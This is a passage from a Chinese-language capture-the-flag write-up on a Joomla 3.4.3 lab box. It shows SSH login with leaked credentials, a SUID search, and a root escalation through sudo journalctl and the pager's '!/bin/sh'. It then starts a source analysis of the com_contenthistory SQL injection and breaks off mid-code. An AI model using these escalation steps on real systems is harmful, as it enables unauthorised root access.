+</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="nv">$smtpauth</span> <span class="o">=</span> <span class="s1">&#39;0&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="nv">$smtpuser</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="nv">$smtppass</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="nv">$smtphost</span> <span class="o">=</span> <span class="s1">&#39;localhost&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="nv">$smtpsecure</span> <span class="o">=</span> <span class="s1">&#39;none&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="nv">$smtpport</span> <span class="o">=</span> <span class="s1">&#39;25&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="nv">$caching</span> <span class="o">=</span> <span class="s1">&#39;0&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="nv">$cache_handler</span> <span class="o">=</span> <span class="s1">&#39;file&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="nv">$cachetime</span> <span class="o">=</span> <span class="s1">&#39;15&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="nv">$MetaDesc</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="nv">$MetaKeys</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="nv">$MetaTitle</span> <span class="o">=</span> <span class="s1">&#39;1&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="nv">$MetaAuthor</span> <span class="o">=</span> <span class="s1">&#39;1&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="nv">$MetaVersion</span> <span class="o">=</span> <span class="s1">&#39;0&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="nv">$robots</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="nv">$sef</span> <span class="o">=</span> <span class="s1">&#39;1&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="nv">$sef_rewrite</span> <span class="o">=</span> <span class="s1">&#39;0&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="nv">$sef_suffix</span> <span class="o">=</span> <span class="s1">&#39;0&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="nv">$unicodeslugs</span> <span class="o">=</span> <span class="s1">&#39;0&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="nv">$feed_limit</span> <span class="o">=</span> <span class="s1">&#39;10&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="nv">$log_path</span> <span class="o">=</span> <span class="s1">&#39;/var/www/html/joomla/logs&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="nv">$tmp_path</span> <span class="o">=</span> <span class="s1">&#39;/var/www/html/joomla/tmp&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="nv">$lifetime</span> <span class="o">=</span> <span class="s1">&#39;15&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="nv">$session_handler</span> <span class="o">=</span> <span class="s1">&#39;database&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>由于是低权限用户，没法到根目录下去，联想到在Joomla数据库中有一个账户elliot，和可疑的邮箱，用这个登一下22端口的ssh试一试</p>
+<p><img src="https://cdn.cdnjson.com/pic.html?url=https://tvax4.sinaimg.cn/large/009XQ7msgy1icwnry5csyj315o0uub24.jpg"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20260415154827384"
+	
+	
+></p>
+<p>成功登录，拿到第一个flag</p>
+<p><img src="https://cdn.cdnjson.com/pic.html?url=https://tvax2.sinaimg.cn/large/009XQ7msgy1icwnrydamxj30h905876c.jpg"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20260415154849735"
+	
+	
+></p>
+<p>可以看到这里依旧是低权限用户，先用find一下SUID</p>
+<blockquote>
+<p>find / -perm -4000 -type f</p></blockquote>
+<p><img src="https://cdn.cdnjson.com/pic.html?url=https://tvax2.sinaimg.cn/large/009XQ7msgy1icwnryn2xnj30cy0fcdm1.jpg"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20260415155516440"
+	
+	
+></p>
+<p>顺手看一眼有哪些用户</p>
+<p><img src="https://cdn.cdnjson.com/pic.html?url=https://tvax3.sinaimg.cn/large/009XQ7msgy1icwnrz2nhwj30q80mi7n8.jpg"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20260415160104603"
+	
+	
+></p>
+<p>看到除了我们登录上去的elliot之外还有一个用户tyrell，先从这里找突破口</p>
+<p>在一堆Permission denied中我们找到了：</p>
+<p><img src="https://cdn.cdnjson.com/pic.html?url=https://tvax1.sinaimg.cn/large/009XQ7msgy1icwnrz8k4ej30cj03gjsv.jpg"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20260415160413050"
+	
+	
+></p>
+<p><img src="https://cdn.cdnjson.com/pic.html?url=https://tvax2.sinaimg.cn/large/009XQ7msgy1icwnrzeu2vj309t00nt8r.jpg"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20260415160650137"
+	
+	
+></p>
+<p>看一眼这几个文件</p>
+<p><img src="https://cdn.cdnjson.com/pic.html?url=https://tvax1.sinaimg.cn/large/009XQ7msgy1icwnrzl998j30gz0560vg.jpg"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20260415160731530"
+	
+	
+></p>
+<p>拿到了账户密码</p>
+<p>登录到tyrell账户，依旧是低权限</p>
+<p>查看下当前账户是否存在可以使用的特权命令或文件：sudo -l，发现存在/bin/journalctl命令。</p>
+<p><img src="https://cdn.cdnjson.com/pic.html?url=https://tvax3.sinaimg.cn/large/009XQ7msgy1icwnrzslndj30u304241f.jpg"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20260415161342370"
+	
+	
+></p>
+<p>journalctl可以用 ! /bin/sh的方式提权</p>
+<p><img src="https://cdn.cdnjson.com/pic.html?url=https://tvax2.sinaimg.cn/large/009XQ7msgy1icwns0hjacj30pu07d78f.jpg"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20260415161841863"
+	
+	
+></p>
+<p>这里的原理是，因为这里journalctl是NOPASSWD的，所以我们用sudo运行journalctl时，不用输入root密码，同时它的所有组件（包括分页器)都会运行在root权限下，而journalctl是 Linux 用来查看系统日志的工具。为了方便用户翻阅超长的日志，它默认会调用一个分页器通常是 less。因为 less 是被 root 身份的 journalctl 调用的，所以在 less 里执行的任何命令也都是 root 权限，而less可以用!/bin/sh的方式提权，从而我们拿到了root权限。</p>
+<p>拿到了第二个flag</p>
+<p>综上来看，这里利用的主要漏洞是Joomla的SQL注入和信息泄露</p>
+<p>所以我们最后来分析一下造成joomla 3.4.3 SQL注入的原因</p>
+<h3 id="漏洞分析">漏洞分析
+</h3><p>最开始我们的payload会到<code>administrator/components/com_contenthistory/models/history.php</code>下的<code>getListQuery()</code>函数：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">protected</span> <span class="k">function</span> <span class="nf">getListQuery</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">	<span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="c1">// Create a new query object.
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>		<span class="nv">$db</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">getDbo</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">		<span class="nv">$query</span> <span class="o">=</span> <span class="nv">$db</span><span class="o">-&gt;</span><span class="na">getQuery</span><span class="p">(</span><span class="k">true</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">		<span class="c1">// Select the required fields from the table.
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>		<span class="nv">$query</span><span class="o">-&gt;</span><span class="na">select</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">			<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">getState</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">				<span class="s1">&#39;list.select&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">				<span class="s1">&#39;h.version_id, h.ucm_item_id, h.ucm_type_id, h.version_note, h.save_date, h.editor_user_id,&#39;</span> <span class="o">.</span>
+</span></span><span class="line"><span class="cl">				<span class="s1">&#39;h.character_count, h.sha1_hash, h.version_data, h.keep_forever&#39;</span>
+</span></span><span class="line"><span class="cl">			<span class="p">)</span>
+</span></span><span class="line"><span class="cl">		<span class="p">)</span>
+</span></span><span class="line"><span class="cl">		<span class="o">-&gt;</span><span class="na">from</span><span class="p">(</span><span class="nv">$db</span><span class="o">-&gt;</span><span class="na">quoteName</span><span class="p">(</span><span class="s1">&#39;#__ucm_history&#39;</span><span class="p">)</span> <span class="o">.</span> <span class="s1">&#39; AS h&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">		<span class="o">-&gt;</span><span class="na">where</span><span class="p">(</span><span class="nv">$db</span><span class="o">-&gt;</span><span class="na">quoteName</span><span class="p">(</span><span class="s1">&#39;h.ucm_item_id&#39;</span><span class="p">)</span> <span class="o">.</span> <span class="s1">&#39; = &#39;</span> <span class="o">.</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">getState</span><span class="p">(</span><span class="s1">&#39;item_id&#39;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">		<span class="o">-&gt;</span><span class="na">where</span><span class="p">(</span><span class="nv">$db</span><span class="o">-&gt;</span><span class="na">quoteName</span><span class="p">(</span><span class="s1">&#39;h.ucm_type_id&#39;</span><span class="p">)</span> <span class="o">.</span> <span class="s1">&#39; = &#39;</span> <span class="o">.</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">getState</span><span class="p">(</span><span class="s1">&#39;type_id&#39;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">		<span class="c1">// Join over the users for the editor
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>		<span class="o">-&gt;</span><span class="na">select</span><span class="p">(</span><span class="s1">&#39;uc.name AS editor&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">		<span class="o">-&gt;</span><span class="na">join</span><span class="p">(</span><span class="s1">&#39;LEFT&#39;</span><span class="p">,</span> <span class="s1">&#39;#__users AS uc ON uc.id = h.editor_user_id&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">		<span class="c1">// Add the list ordering clause.
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>		<span class="nv">$orderCol</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">state</span><span class="o">-&gt;</span><span class="na">get</span><span class="p">(</span><span class="s1">&#39;list.ordering&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">		<span class="nv">$orderDirn</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">state</span><span class="o">-&gt;</span><span class="na">get</span><span class="p">(</span><span class="s1">&#39;list.direction&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">		<span class="nv">$query</span><span class="o">-&gt;</span><span class="na">order</span><span class="p">(</span><span class="nv">$db</span><span class="o">-&gt;</span><span class="na">quoteName</span><span class="p">(</span><span class="nv">$orderCol</span><span class="p">)</span> <span class="o">.</span> <span class="nv">$orderDirn</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">		<span class="k">return</span> <span class="nv">$query</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>输入会给到getState函数，进去看看，在<code>libraries/legacy/model/legacy.php</code>中</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">public</span> <span class="k">function</span> <span class="nf">getState</span><span class="p">(</span><span class="nv">$property</span> <span class="o">=</span> <span class="k">null</span><span class="p">,</span> <span class="nv">$default</span> <span class="o">=</span> <span class="k">null</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	<span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">__state_set</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">		<span class="p">{</span>
+</span></span><span class="line"><span class="cl">			<span class="c1">// Protected method to auto-populate the model state.
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>			<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">populateState</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">			<span class="c1">// Set the model state set flag to true.
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>			<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">__state_set</span> <span class="o">=</span> <span class="k">true</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">		<span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">		<span class="k">return</span> <span class="nv">$property</span> <span class="o">===</span> <span class="k">null</span> <span class="o">?</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">state</span> <span class="o">:</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">state</span><span class="o">-&gt;</span><span class="na">get</span><span class="p">(</span><span class="nv">$property</span><span class="p">,</span> <span class="nv">$default</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>可以看到，这里会判断model状态是否被设置，如果没有会调用populateState()函数来设置，去看看实现</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="c1">// administrator/components/com_contenthistory/models/history.php
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="k">protected</span> <span class="k">function</span> <span class="nf">populateState</span><span class="p">(</span><span class="nv">$ordering</span> <span class="o">=</span> <span class="k">null</span><span class="p">,</span> <span class="nv">$direction</span> <span class="o">=</span> <span class="k">null</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	<span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="nv">$input</span> <span class="o">=</span> <span class="nx">JFactory</span><span class="o">::</span><span class="na">getApplication</span><span class="p">()</span><span class="o">-&gt;</span><span class="na">input</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">		<span class="nv">$itemId</span> <span class="o">=</span> <span class="nv">$input</span><span class="o">-&gt;</span><span class="na">get</span><span class="p">(</span><span class="s1">&#39;item_id&#39;</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="s1">&#39;integer&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">		<span class="nv">$typeId</span> <span class="o">=</span> <span class="nv">$input</span><span class="o">-&gt;</span><span class="na">get</span><span class="p">(</span><span class="s1">&#39;type_id&#39;</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="s1">&#39;integer&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">		<span class="nv">$typeAlias</span> <span class="o">=</span> <span class="nv">$input</span><span class="o">-&gt;</span><span class="na">get</span><span class="p">(</span><span class="s1">&#39;type_alias&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="s1">&#39;string&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">		<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">setState</span><span class="p">(</span><span class="s1">&#39;item_id&#39;</span><span class="p">,</span> <span class="nv">$itemId</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">		<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">setState</span><span class="p">(</span><span class="s1">&#39;type_id&#39;</span><span class="p">,</span> <span class="nv">$typeId</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">		<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">setState</span><span class="p">(</span><span class="s1">&#39;type_alias&#39;</span><span class="p">,</span> <span class="nv">$typeAlias</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">		<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">setState</span><span class="p">(</span><span class="s1">&#39;sha1_hash&#39;</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">getSha1Hash</span><span class="p">());</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">		<span class="c1">// Load the parameters.
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>		<span class="nv">$params</span> <span class="o">=</span> <span class="nx">JComponentHelper</span><span class="o">::</span><span class="na">getParams</span><span class="p">(</span><span class="s1">&#39;com_contenthistory&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">		<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">setState</span><span class="p">(</span><span class="s1">&#39;params&#39;</span><span class="p">,</span> <span class="nv">$params</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">		<span class="c1">// List state information.
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>		<span class="k">parent</span><span class="o">::</span><span class="na">populateState</span><span class="p">(</span><span class="s1">&#39;h.save_date&#39;</span><span class="p">,</span> <span class="s1">&#39;DESC&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>可以看到，这里获取了item_id等，强制转型成integer然后用setState函数来赋值，即从用户输入中取出item_id,type_id,type_alias,等几个变量，对当前model的属性进行赋值，由于可以控制的参数都被强制转成整形，所以只能看看其他地方，可以看到最后继承了populateState，去看看父类是怎么实现的</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">  1
+</span><span class="lnt">  2
+</span><span class="lnt">  3
+</span><span class="lnt">  4
+</span><span class="lnt">  5
+</span><span class="lnt">  6
+</span><span class="lnt">  7
+</span><span class="lnt">  8
+</span><span class="lnt">  9
+</span><span class="lnt"> 10
+</span><span class="lnt"> 11
+</span><span class="lnt"> 12
+</span><span class="lnt"> 13
+</span><span class="lnt"> 14
+</span><span class="lnt"> 15
+</span><span class="lnt"> 16
+</span><span class="lnt"> 17
+</span><span class="lnt"> 18
+</span><span class="lnt"> 19
+</span><span class="lnt"> 20
+</span><span class="lnt"> 21
+</span><span class="lnt"> 22
+</span><span class="lnt"> 23
+</span><span class="lnt"> 24
+</span><span class="lnt"> 25
+</span><span class="lnt"> 26
+</span><span class="lnt"> 27
+</span><span class="lnt"> 28
+</span><span class="lnt"> 29
+</span><span class="lnt"> 30
+</span><span class="lnt"> 31
+</span><span class="lnt"> 32
+</span><span class="lnt"> 33
+</span><span class="lnt"> 34
+</span><span class="lnt"> 35
+</span><span class="lnt"> 36
+</span><span class="lnt"> 37
+</span><span class="lnt"> 38
+</span><span class="lnt"> 39
+</span><span class="lnt"> 40
+</span><span class="lnt"> 41
+</span><span class="lnt"> 42
+</span><span class="lnt"> 43
+</span><span class="lnt"> 44
+</span><span class="lnt"> 45
+</span><span class="lnt"> 46
+</span><span class="lnt"> 47
+</span><span class="lnt"> 48
+</span><span class="lnt"> 49
+</span><span class="lnt"> 50
+</span><span class="lnt"> 51
+</span><span class="lnt"> 52
+</span><span class="lnt"> 53
+</span><span class="lnt"> 54
+</span><span class="lnt"> 55
+</span><span class="lnt"> 56
+</span><span class="lnt"> 57
+</span><span class="lnt"> 58
+</span><span class="lnt"> 59
+</span><span class="lnt"> 60
+</span><span class="lnt"> 61
+</span><span class="lnt"> 62
+</span><span class="lnt"> 63
+</span><span class="lnt"> 64
+</span><span class="lnt"> 65
+</span><span class="lnt"> 66
+</span><span class="lnt"> 67
+</span><span class="lnt"> 68
+</span><span class="lnt"> 69
+</span><span class="lnt"> 70
+</span><span class="lnt"> 71
+</span><span class="lnt"> 72
+</span><span class="lnt"> 73
+</span><span class="lnt"> 74
+</span><span class="lnt"> 75
+</span><span class="lnt"> 76
+</span><span class="lnt"> 77
+</span><span class="lnt"> 78
+</span><span class="lnt"> 79
+</span><span class="lnt"> 80
+</span><span class="lnt"> 81
+</span><span class="lnt"> 82
+</span><span class="lnt"> 83
+</span><span class="lnt"> 84
+</span><span class="lnt"> 85
+</span><span class="lnt"> 86
+</span><span class="lnt"> 87
+</span><span class="lnt"> 88
+</span><span class="lnt"> 89
+</span><span class="lnt"> 90
+</span><span class="lnt"> 91
+</span><span class="lnt"> 92
+</span><span class="lnt"> 93
+</span><span class="lnt"> 94
+</span><span class="lnt"> 95
+</span><span class="lnt"> 96
+</span><span class="lnt"> 97
+</span><span class="lnt"> 98
+</span><span class="lnt"> 99
+</span><span class="lnt">100
+</span><span class="lnt">101
+</span><span class="lnt">102
+</span><span class="lnt">103
+</span><span class="lnt">104
+</span><span class="lnt">105
+</span><span class="lnt">106
+</span><span class="lnt">107
+</span><span class="lnt">108
+</span><span class="lnt">109
+</span><span class="lnt">110
+</span><span class="lnt">111
+</span><span class="lnt">112
+</span><span class="lnt">113
+</span><span class="lnt">114
+</span><span class="lnt">115
+</span><span class="lnt">116
+</span><span class="lnt">117
+</span><span class="lnt">118
+</span><span class="lnt">119
+</span><span class="lnt">120
+</span><span class="lnt">121
+</span><span class="lnt">122
+</span><span class="lnt">123
+</span><span class="lnt">124
+</span><span class="lnt">125
+</span><span class="lnt">126
+</span><span class="lnt">127
+</span><span class="lnt">128
+</span><span class="lnt">129
+</span><span class="lnt">130
+</span><span class="lnt">131
+</span><span class="lnt">132
+</span><span class="lnt">133
+</span><span class="lnt">134
+</span><span class="lnt">135
+</span><span class="lnt">136
+</span><span class="lnt">137
+</span><span class="lnt">138
+</span><span class="lnt">139
+</span><span class="lnt">140
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="c1">// libraries/legacy/model/list.php
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">protected</span> <span class="k">function</span> <span class="nf">populateState</span><span class="p">(</span><span class="nv">$ordering</span> <span class="o">=</span> <span class="k">null</span><span class="p">,</span> <span class="nv">$direction</span> <span class="o">=</span> <span class="k">null</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	<span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="c1">// If the context is set, assume that stateful lists are used.
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>		<span class="k">if</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">context</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">		<span class="p">{</span>
+</span></span><span class="line"><span class="cl">			<span class="nv">$app</span> <span class="o">=</span> <span class="nx">JFactory</span><span class="o">::</span><span class="na">getApplication</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">			<span class="c1">// Receive &amp; set filters
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>			<span class="k">if</span> <span class="p">(</span><span class="nv">$filters</span> <span class="o">=</span> <span class="nv">$app</span><span class="o">-&gt;</span><span class="na">getUserStateFromRequest</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">context</span> <span class="o">.</span> <span class="s1">&#39;.filter&#39;</span><span class="p">,</span> <span class="s1">&#39;filter&#39;</span><span class="p">,</span> <span class="k">array</span><span class="p">(),</span> <span class="s1">&#39;array&#39;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">			<span class="p">{</span>
+</span></span><span class="line"><span class="cl">				<span class="k">foreach</span> <span class="p">(</span><span class="nv">$filters</span> <span class="k">as</span> <span class="nv">$name</span> <span class="o">=&gt;</span> <span class="nv">$value</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">				<span class="p">{</span>
+</span></span><span class="line"><span class="cl">					<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">setState</span><span class="p">(</span><span class="s1">&#39;filter.&#39;</span> <span class="o">.</span> <span class="nv">$name</span><span class="p">,</span> <span class="nv">$value</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">				<span class="p">}</span>
+</span></span><span class="line"><span class="cl">			<span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">			<span class="nv">$limit</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">			<span class="c1">// Receive &amp; set list options
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>			<span class="k">if</span> <span class="p">(</span><span class="nv">$list</span> <span class="o">=</span> <span class="nv">$app</span><span class="o">-&gt;</span><span class="na">getUserStateFromRequest</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">context</span> <span class="o">.</span> <span class="s1">&#39;.list&#39;</span><span class="p">,</span> <span class="s1">&#39;list&#39;</span><span class="p">,</span> <span class="k">array</span><span class="p">(),</span> <span class="s1">&#39;array&#39;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">			<span class="p">{</span>
+</span></span><span class="line"><span class="cl">				<span class="k">foreach</span> <span class="p">(</span><span class="nv">$list</span> <span class="k">as</span> <span class="nv">$name</span> <span class="o">=&gt;</span> <span class="nv">$value</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">				<span class="p">{</span>
+</span></span><span class="line"><span class="cl">					<span class="c1">// Extra validations
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>					<span class="k">switch</span> <span class="p">(</span><span class="nv">$name</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">					<span class="p">{</span>
+</span></span><span class="line"><span class="cl">						<span class="k">case</span> <span class="s1">&#39;fullordering&#39;</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">							<span class="nv">$orderingParts</span> <span class="o">=</span> <span class="nx">explode</span><span class="p">(</span><span class="s1">&#39; &#39;</span><span class="p">,</span> <span class="nv">$value</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">							<span class="k">if</span> <span class="p">(</span><span class="nx">count</span><span class="p">(</span><span class="nv">$orderingParts</span><span class="p">)</span> <span class="o">&gt;=</span> <span class="mi">2</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">							<span class="p">{</span>
+</span></span><span class="line"><span class="cl">								<span class="c1">// Latest part will be considered the direction
